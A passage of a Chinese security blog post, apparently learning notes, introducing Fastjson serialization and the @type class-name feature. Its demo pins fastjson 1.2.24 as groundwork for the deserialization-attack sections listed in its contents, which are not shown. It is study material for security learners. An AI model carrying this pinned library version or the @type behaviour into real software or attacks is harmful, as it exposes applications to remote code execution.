@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>java安全 Fastjson - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="java安全 Fastjson">
+  <meta property="og:description" content="Fastjson 什么是Fastjson？ fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
+JavaBean是啥呢 看https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680
+在Java中，有很多class的定义都符合这样的规范：
+若干private实例字段； 通过public方法来读写实例字段。 例如：
+public class Person { private String name; private int age; public String getName() { return this.name; } public void setName(String name) { this.name = name; } public int getAge() { return this.age; } public void setAge(int age) { this.age = age; } } 如果读写方法符合以下这种命名规范：
+// 读方法: public Type getXyz() // 写方法: public void setXyz(Type value) 那么这种class被称为JavaBean
+fastjson具体有文档 https://github.com/alibaba/fastjson/wiki/Quick-Start-CN序列化与反序列化 了解一下fastjson的序列化 反序列化">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:54:48+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:54:48+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java安全 Fastjson">
+  <meta name="twitter:description" content="Fastjson 什么是Fastjson？ fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
+JavaBean是啥呢 看https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680
+在Java中，有很多class的定义都符合这样的规范：
+若干private实例字段； 通过public方法来读写实例字段。 例如：
+public class Person { private String name; private int age; public String getName() { return this.name; } public void setName(String name) { this.name = name; } public int getAge() { return this.age; } public void setAge(int age) { this.age = age; } } 如果读写方法符合以下这种命名规范：
+// 读方法: public Type getXyz() // 写方法: public void setXyz(Type value) 那么这种class被称为JavaBean
+fastjson具体有文档 https://github.com/alibaba/fastjson/wiki/Quick-Start-CN序列化与反序列化 了解一下fastjson的序列化 反序列化">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/" /><link rel="prev" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-jndi%E6%B3%A8%E5%85%A5/" /><link rel="next" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "java安全 Fastjson",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-fastjson\/"
+        },"genre": "posts","keywords": "java","wordcount":  552 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-fastjson\/","datePublished": "2024-08-20T22:54:48+08:00","dateModified": "2024-08-20T22:54:48+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">java安全 Fastjson</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/java%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;552 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#什么是fastjson">什么是Fastjson？</a></li>
+    <li><a href="#序列化与反序列化">序列化与反序列化</a></li>
+    <li><a href="#重点">重点</a></li>
+    <li><a href="#反序列化漏洞">反序列化漏洞</a>
+      <ul>
+        <li><a href="#调用流程">调用流程</a></li>
+        <li><a href="#jndi注入">JNDI注入</a></li>
+        <li><a href="#templatesimpl-链子">TemplatesImpl 链子</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="fastjson">Fastjson</h1>
+<h2 id="什么是fastjson">什么是Fastjson？</h2>
+<p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
+<p>JavaBean是啥呢 看https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</p>
+<blockquote>
+<p>在Java中，有很多<code>class</code>的定义都符合这样的规范：</p>
+<ul>
+<li>若干<code>private</code>实例字段；</li>
+<li>通过<code>public</code>方法来读写实例字段。</li>
+</ul>
+<p>例如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Person</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String name;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> age;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getName</span>() { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setName</span>(String name) { <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getAge</span>() { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">age</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setAge</span>(<span style="color:#66d9ef">int</span> age) { <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> age; }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>如果读写方法符合以下这种命名规范：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 读方法:</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Type <span style="color:#a6e22e">getXyz</span>()
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 写方法:</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setXyz</span>(Type value)
+</span></span></code></pre></div><p>那么这种<code>class</code>被称为<code>JavaBean</code></p>
+</blockquote>
+<p>fastjson具体有文档 <a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN" target="_blank" rel="noopener noreffer">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a>
+</p>
+<h2 id="序列化与反序列化">序列化与反序列化</h2>
+<p>了解一下fastjson的序列化 反序列化</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//序列化 JavaBean -&gt; JSON</span>
+</span></span><span style="display:flex;"><span>String text <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">toJSONString</span>(obj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//反序列化 JSON -&gt; JavaBean</span>
+</span></span><span style="display:flex;"><span>VO vo <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parse</span>(); <span style="color:#75715e">//解析为JSONObject类型或者JSONArray类型</span>
+</span></span><span style="display:flex;"><span>VO vo <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(<span style="color:#e6db74">&#34;{...}&#34;</span>); <span style="color:#75715e">//JSON文本解析成JSONObject类型</span>
+</span></span><span style="display:flex;"><span>VO vo <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(<span style="color:#e6db74">&#34;{...}&#34;</span>, VO.<span style="color:#a6e22e">class</span>); <span style="color:#75715e">//JSON文本解析成VO.class类</span>
+</span></span></code></pre></div><p>搞个demo</p>
+<p>导入包</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;groupId&gt;</span>com.alibaba<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;artifactId&gt;</span>fastjson<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;version&gt;</span>1.2.24<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> demo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.alibaba.fastjson.JSON;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String name;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> age;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">User</span>(){
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;调用constructor&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getName</span>() {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;调用getName&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> name;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setName</span>(String name) {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;调用setName&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getAge</span>() {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;调用getAge&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> age;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setAge</span>(<span style="color:#66d9ef">int</span> age) {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;调用setAge&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> age;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>json反序列化</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> demo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.alibaba.fastjson.JSON;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.alibaba.fastjson.serializer.SerializerFeature;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//创建一个用于实验的user类</span>
+</span></span><span style="display:flex;"><span>        User user1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> User();
+</span></span><span style="display:flex;"><span>        user1.<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">&#34;ThnPkm&#34;</span>);
+</span></span><span style="display:flex;"><span>        user1.<span style="color:#a6e22e">setAge</span>(18);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//序列化</span>
+</span></span><span style="display:flex;"><span>        String serializedStr <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">toJSONString</span>(user1);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;serializedStr= &#34;</span><span style="color:#f92672">+</span>serializedStr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//通过parse方法进行反序列化，返回的是一个JSONObject</span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;1.parse方法进行反序列化:&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object obj1 <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parse</span>(serializedStr);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parse反序列化对象名称:&#34;</span><span style="color:#f92672">+</span>obj1.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>());
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parse反序列化：&#34;</span><span style="color:#f92672">+</span>obj1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//通过parseObject,不指定类，返回的是一个JSONObject</span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;2.parseObject不指定类进行反序列化:&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object obj2 <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(serializedStr);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parseObject反序列化对象名称:&#34;</span><span style="color:#f92672">+</span>obj2.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>());
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parseObject反序列化:&#34;</span><span style="color:#f92672">+</span>obj2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//通过parseObject,指定类后返回的是一个相应的类对象</span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;3.parseObject指定类进行反序列化:&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object obj3 <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(serializedStr,User.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parseObject反序列化对象名称:&#34;</span><span style="color:#f92672">+</span>obj3.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>());
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;parseObject反序列化:&#34;</span><span style="color:#f92672">+</span>obj3);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>调用constructor
+</span></span><span style="display:flex;"><span>调用setName
+</span></span><span style="display:flex;"><span>调用setAge
+</span></span><span style="display:flex;"><span>调用getAge
+</span></span><span style="display:flex;"><span>调用getName
+</span></span><span style="display:flex;"><span>serializedStr<span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;age&#34;</span>:18,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ThnPkm&#34;</span>}
+</span></span><span style="display:flex;"><span>1.<span style="color:#a6e22e">parse方法进行反序列化</span>:
+</span></span><span style="display:flex;"><span>parse反序列化对象名称:com.<span style="color:#a6e22e">alibaba</span>.<span style="color:#a6e22e">fastjson</span>.<span style="color:#a6e22e">JSONObject</span>
+</span></span><span style="display:flex;"><span>parse反序列化<span style="color:#960050;background-color:#1e0010">：</span>{<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ThnPkm&#34;</span>,<span style="color:#e6db74">&#34;age&#34;</span>:18}
+</span></span><span style="display:flex;"><span>2.<span style="color:#a6e22e">parseObject不指定类进行反序列化</span>:
+</span></span><span style="display:flex;"><span>parseObject反序列化对象名称:com.<span style="color:#a6e22e">alibaba</span>.<span style="color:#a6e22e">fastjson</span>.<span style="color:#a6e22e">JSONObject</span>
+</span></span><span style="display:flex;"><span>parseObject反序列化:{<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ThnPkm&#34;</span>,<span style="color:#e6db74">&#34;age&#34;</span>:18}
+</span></span><span style="display:flex;"><span>3.<span style="color:#a6e22e">parseObject指定类进行反序列化</span>:
+</span></span><span style="display:flex;"><span>调用constructor
+</span></span><span style="display:flex;"><span>调用setAge
+</span></span><span style="display:flex;"><span>调用setName
+</span></span><span style="display:flex;"><span>parseObject反序列化对象名称:demo.<span style="color:#a6e22e">User</span>
+</span></span><span style="display:flex;"><span>parseObject反序列化:demo.<span style="color:#a6e22e">User</span><span style="color:#a6e22e">@573fd745</span>
+</span></span></code></pre></div><p>这三种的方法区别感觉不是很重要，基于 setter / getter来实现赋值，具体区别先不探究了。</p>
+<h2 id="重点">重点</h2>
+<p>上面的反序列化例子其实没啥问题，我们设想一种情况 如下</p>
+<p>吃的苹果 和 苹果手机 同属于水果类</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Apple</span> <span style="color:#66d9ef">implements</span> Fruit {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> price;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//省略 setter/getter、toString等</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">IPhone</span> <span style="color:#66d9ef">implements</span> Fruit {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> price;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//省略 setter/getter、toString等</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>序列化对象之后，假设苹果对象的price为1，Apple类对象序列化为json格式后为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;Fruit&#34;</span>:{<span style="color:#f92672">&#34;price&#34;</span>:<span style="color:#ae81ff">1</span>}}
+</span></span></code></pre></div><p>假设IPhone对象的price为1000,序列化为json格式后为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;Fruit&#34;</span>:{<span style="color:#f92672">&#34;price&#34;</span>:<span style="color:#ae81ff">1000</span>}}
+</span></span></code></pre></div><p>我们这时候就不能分辨出这个<code>Fruit</code>原始类型到底是Apple还是IPhone了</p>
+<p>所以Fastjson提供了一个解决方式，就是在序列化时候添加了一个<code>SerializerFeature.WriteClassName</code>参数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String serializedStr<span style="color:#f92672">=</span>JSON.<span style="color:#a6e22e">toJSONString</span>(user,SerializerFeature.<span style="color:#a6e22e">WriteClassName</span>);
+</span></span></code></pre></div><p>添加了这个参数的话，会将对象类型一起序列化并且会写入到<code>@type</code>字段中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> demo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.alibaba.fastjson.JSON;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.alibaba.fastjson.serializer.SerializerFeature;
+</span></span><span style="display:flex;"><span>
